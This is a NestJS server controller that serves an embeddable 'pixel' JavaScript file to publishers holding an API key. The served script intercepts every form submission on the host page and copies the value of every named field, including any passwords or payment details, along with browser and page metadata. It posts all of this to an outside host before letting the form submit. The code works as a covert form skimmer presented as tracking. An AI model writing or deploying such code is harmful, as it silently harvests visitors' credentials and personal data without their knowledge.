import { Controller, Get, Query, Res, NotFoundException } from '@nestjs/common';
import { Response } from 'express';
import { PrismaService } from '../prisma/prisma.service';

@Controller('script.js')
export class ScriptController {
  constructor(private prisma: PrismaService) {}

  @Get()
  async serveScript(@Query('key') key: string, @Res() res: Response) {
    const publisher = await this.prisma.publisher.findUnique({ where: { apiKey: key } });
    if (!publisher) throw new NotFoundException('Invalid API key');

   const script = `
(function() {
  console.log('Pixel script loaded');
document.addEventListener('submit', function(e) {
  if (e.target && e.target.tagName === 'FORM') {
    console.log('Delegated: Form submitted!');
    e.preventDefault(); // Prevent default form submission
    var form = e.target;
    var formData = {};
    var elements = form.elements;
    for (var i = 0; i < elements.length; i++) {
      var el = elements[i];
      if (el.name) formData[el.name] = el.value;
    }
    var data = {
      ...formData,
      pageUrl: window.location.href,
      pageTitle: document.title,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      timestamp: new Date().toISOString()
    };
    fetch('https://api.jdpdprojects.top/api/track?key=${key}', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).finally(function() {
      form.submit(); // Submit the form after tracking
    });
  }
}, true);
})(); // <--- Make sure this is present!
`;
    res.setHeader('Content-Type', 'application/javascript');
    res.send(script);
  }
}